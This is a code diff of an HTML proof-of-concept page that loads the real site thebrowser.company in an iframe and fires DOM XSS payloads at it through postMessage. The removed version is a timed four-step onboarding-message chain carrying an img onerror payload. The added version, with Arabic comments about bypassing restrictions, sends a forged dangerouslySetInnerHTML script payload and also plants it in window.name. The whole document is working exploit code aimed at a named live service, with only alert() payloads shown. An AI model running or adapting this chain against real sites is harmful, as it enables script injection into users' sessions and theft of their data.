@@ -1,59 +1,29 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>🔥 Full DOM XSS Exploit - thebrowser.company</title>
-  <style>
-    body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-    iframe { border: 2px solid #0f0; width: 100%; height: 600px; margin-top: 20px; }
-  </style>
-</head>
+<head><title>💥 Build XSS manually</title></head>
 <body>
-  <h2>☠️ DOM XSS Exploit - Final Confirmed Chain</h2>
-  <iframe id="target" src="https://thebrowser.company" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>
 
-  <script>
-    const iframe = document.getElementById("target");
-    const payload = `<img src=x onerror="alert('🔥 XSS from Final Exploit')">`;
+<h2>💣 تفجير الثغرة يدويًا</h2>
+<iframe id="target" src="https://thebrowser.company" width="100%" height="600"></iframe>
 
-    const step0 = {
-      message: "OB_ENABLE_ONBOARDING",
-      content: { OB_ONBOARDING_SESSION: true }
-    };
+<script>
+  const payload = {
+    props: {
+      dangerouslySetInnerHTML: {
+        __html: `<script>alert('🔥 XSS BUILT')</script>`
+      }
+    }
+  };
 
-    const step1 = { message: "OB_SHOW_PICKER" };
-    const step2 = {
-      message: "OB_SHOULD_SHOW_PICKER",
-      content: { marketerId: [payload] }
-    };
-    const step3 = {
-      message: "OB_OPEN_PICKER",
-      content: { marketerId: [payload] }
-    };
+  window.name = JSON.stringify(payload); // نضع البايلود في name لتجاوز القيود
 
-    iframe.onload = () => {
-      console.log("✅ iframe loaded");
+  const iframe = document.getElementById("target");
 
-      setTimeout(() => {
-        console.log("🧩 Step 0: OB_ENABLE_ONBOARDING");
-        iframe.contentWindow.postMessage(step0, "*");
+  iframe.onload = () => {
+    console.log("✅ iframe ready, sending forged message");
+    iframe.contentWindow.postMessage(payload, "*");
+  };
+</script>
 
-        setTimeout(() => {
-          console.log("🟡 Step 1: OB_SHOW_PICKER");
-          iframe.contentWindow.postMessage(step1, "*");
-
-          setTimeout(() => {
-            console.log("🟠 Step 2: OB_SHOULD_SHOW_PICKER");
-            iframe.contentWindow.postMessage(step2, "*");
-
-            setTimeout(() => {
-              console.log("🔴 Step 3: OB_OPEN_PICKER");
-              iframe.contentWindow.postMessage(step3, "*");
-            }, 800);
-          }, 800);
-        }, 800);
-      }, 1000);
-    };
-  </script>
 </body>
 </html>
